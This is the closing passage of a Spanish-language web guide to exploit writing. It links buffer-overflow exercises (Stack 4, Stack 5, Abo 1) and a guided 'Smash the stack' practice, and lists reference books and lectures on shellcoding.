<p>Con los contenidos vistos hasta el momento es posible avanzar con <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/stack4.c">Stack 4</a>, <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/stack5.c">Stack 5</a> y <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/abo1.c">Abo 1</a>.    <br />
Y está disponible una práctica guiada para la <a href="/https://fundacion-sadosky.github.io/guia-escritura-exploits/buffer-overflow/2-practica.html">resolución de Stack 4 y 5 a través del ataque “Smash the stack”</a>.</p>

<h2 id="material-consultado">Material consultado</h2>
<p>[1]. Anley, C., Heasman, J., Linder, F., Richarte, G. (2007). The Shellcoder’s Handbook: Discovering and Exploiting Security Holes.   <br />
[2]. Erickson, Jon. (2008). Hacking: the art of exploitation.   <br />
[3]. D’Antoine, Sophia. (2015). Shellcoding: Modern Binary Exploitation CSCI 4968. Disponible en: http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf</p>


</div>

    </div>

  </body>
</html>
